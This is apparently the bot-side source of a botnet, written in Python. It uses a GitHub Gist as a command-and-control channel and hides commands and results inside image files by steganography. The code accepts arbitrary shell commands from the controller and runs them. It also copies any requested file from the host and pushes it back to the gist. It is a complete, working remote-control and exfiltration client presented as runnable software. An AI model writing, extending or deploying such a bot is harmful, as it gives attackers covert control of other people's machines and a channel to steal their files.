import argparse
import os
import select
import shlex
import sys
from typing import Optional, Any, Dict, Union, List
import random

from terminal import gray, rst, cyan, magenta, yellow, green, red
from common import \
    CONTROL_IMAGE, \
    UPDATE_INTERVAL, \
    now_ms, \
    decode_data, \
    encode_data, \
    format_timestamp, \
    ParticipantBase

import subprocess


class Bot(ParticipantBase):

    def _setup(self) -> None:
        super()._setup()

        self._name = None
        self._image = None
        self._state: Dict[str, Union[None, int, dict]] = {
            'last_update': None,
            'result': None,
            #   id: ''
            #   exitCode:
            #   stdout:
            #   stderr:
        }

        pass

    def run(self) -> None:
        self._setup()

        while True:
            self._update_state()
            print(
                f'\nAuto update in {cyan}{UPDATE_INTERVAL}{rst} seconds. Press {yellow}enter{rst} to force update.\n'
                f'Press {red}Ctrl-C{rst} to unregister and terminate.\n',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                sys.stdin.readline()
            else:
                # add en empty line
                print('')

        pass

    def destroy(self) -> None:
        print('\nDestroying the bot...')
        if self._comm_client is None:
            return
        self._comm_client.pull_changes()
        if os.path.exists('comm/' + self._name):
            print(f'{gray}unregistering - removing image file from the gist ...{rst}')
            os.remove('comm/' + self._name)
            self._comm_client.add([self._name])
            self._comm_client.commit_and_push_if_needed()
        print(f'{green}Successfully terminated.{rst}')
        pass

    def _get_command(self) -> Any:
        if not os.path.exists('comm/' + CONTROL_IMAGE):
            return None
        control_data = decode_data('comm/' + CONTROL_IMAGE)
        if not isinstance(control_data, dict):
            return None
        if self._name not in control_data:
            return None
        cmd = control_data[self._name]
        if self._is_valid_command(cmd):
            return cmd
        return None

    @staticmethod
    def _is_valid_command(data: Any) -> bool:
        if not isinstance(data, dict):
            return False
        if 'id' not in data or 'name' not in data:
            return False
        if not isinstance(data['id'], str) or not isinstance(data['name'], str):
            return False
        if data['id'] == '':
            return False
        name = data['name']
        if name == 'terminate':
            return True
        if name == 'run':
            shell = data['shell'] if 'shell' in data else None
            cmd = data['cmd'] if 'cmd' in data else None
            if not isinstance(shell, bool) or not isinstance(cmd, str) or cmd == '':
                return False
            return True
        if name == 'copy_from':
            file_name = data['file_name'] if 'file_name' in data else None
            if not isinstance(file_name, str) or file_name == '':
                return False
            return True
        return False

    def _generate_name(self) -> None:
        # TODO: prioritize unused images from the library
        images = list(self._lib_images - {CONTROL_IMAGE})
        self._image = random.choice(images)
        self._name = str(random.randint(0, 9999)) + '-' + self._image
        print(f'generated name {cyan}{self._name}{rst}')
        pass

    def _register(self) -> None:
        # TODO: detect name collision and handle it gracefully
        self._generate_name()
        pass

    def _ensure_registration(self) -> None:
        if self._name is None or not os.path.exists('comm/' + self._name):
            self._register()
        pass

    def _get_additional_files_to_send(self) -> Optional[List[str]]:
        if self._state['result'] is None:
            return None
        if 'files' not in self._state['result']:
            return None
        return self._state['result']['files']

    def _update_state(self) -> None:
        print(f'{gray}updating state ...{rst}')

        self._comm_client.pull_changes()

        self._ensure_registration()

        cmd = self._get_command()

        if cmd is not None:
            print(f"{green}[NEW COMMAND]{rst} id={magenta}{cmd['id']}{rst} cmd: {cyan}{self._cmd_to_string(cmd)}{rst}")
            if cmd['name'] == 'terminate':
                self._handle_terminate_command(cmd)
            elif cmd['name'] == 'run':
                self._handle_run_command(cmd)
            elif cmd['name'] == 'copy_from':
                self._handle_copy_from_command(cmd)
            else:
                print(f'{red}no corresponding handle function, setting result to null{rst}')
                self._state['result'] = None
        else:
            print(f'{gray}no valid command for this bot, setting result to null{rst}')
            self._state['result'] = None

        # update the bot image
        self._state['last_update'] = now_ms()
        encode_data(
            image_file='lib/' + self._image,
            data=self._state,
            output_file='comm/' + self._name,
            additional_files_to_zip=self._get_additional_files_to_send(),
            remove_additional_files_after_zip=True,
        )
        self._comm_client.add([self._name])

        # commit and push all changes if needed
        # note: there can only be one type of changes:
        #   1. added/updated the bot image
        #   (deleted bot image can happen only in self.destroy())
        self._comm_client.commit_and_push_if_needed()

        print(f"{gray}successful update on {green}{format_timestamp(self._state['last_update'])}{rst}")

        pass

    # COMMANDS

    @staticmethod
    def _cmd_to_string(cmd: Dict[str, Union[str, bool, int]]) -> str:
        if cmd['name'] == 'terminate':
            return 'terminate'
        if cmd['name'] == 'copy_from':
            return f"copy_from {cmd['file_name']}"
        if cmd['name'] == 'run':
            return f"shell={'True' if cmd['shell'] else 'False'} run {cmd['cmd']}"
        return 'unknown command'

    def _handle_terminate_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
        print(f'{green}handling terminate command using self.destroy(){rst}')
        self.destroy()
        exit(0)
        pass

    def _handle_run_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
        print(f'{green}handling run command{rst}')

        if cmd['shell']:
            args = cmd['cmd']
        else:
            args = shlex.split(cmd['cmd'])

        try:
            p = subprocess.run(
                args=args,
                shell=cmd['shell'],
                capture_output=True,
                # TODO: if the future, sent back raw bytes (as base64) to the controller
                #       that way we can support non utf-8 stdout/stderr data
                encoding='utf-8',
            )
            result = {
                'id': cmd['id'],
                'timestamp': now_ms(),
                'exit_code': p.returncode,
                'stdout': p.stdout,
                'stderr': p.stderr,
            }
        except FileNotFoundError as ex:
            result = {
                'id': cmd['id'],
                'timestamp': now_ms(),
                'exit_code': -1,
                'stderr': f'FileNotFoundError: {ex}',
            }
            pass

        self._state['result'] = result
        print(f'{green}result set{rst}', result)

        pass

    def _handle_copy_from_command(self, cmd: Dict[str, Union[str, int, bool]]) -> None:
        print(f'{green}handling copy_from command{rst}')

        file_name = cmd['file_name']

        transfer_name = f'{cmd["id"]}-{os.path.basename(file_name)}'

        p = subprocess.run(
            args=['cp', file_name, transfer_name],
            capture_output=True,
            encoding='utf-8',
        )

        result = {
            'id': cmd['id'],
            'timestamp': now_ms(),
            'exit_code': p.returncode,
            'stdout': p.stdout,
            'stderr': p.stderr,
        }

        # only try to send the file if the cp actually succeeded
        if os.path.isfile(transfer_name):
            result['files'] = [transfer_name]

        self._state['result'] = result
        print(f'{green}result set{rst}', result)

        pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the bot will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help=(
            'override the default git commit author'
            ' (useful when you don\'t want to leak your global git config author value)'
        ),
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='skip resetting the git repos if they already exist',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='skip updating the git repos if they already exist',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='shortcut for combination of of --skip-init-reset and --skip-init-pull',
    )
    _args = _parser.parse_args()
    _bot = Bot(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _bot.run()
    except KeyboardInterrupt:
        _bot.destroy()
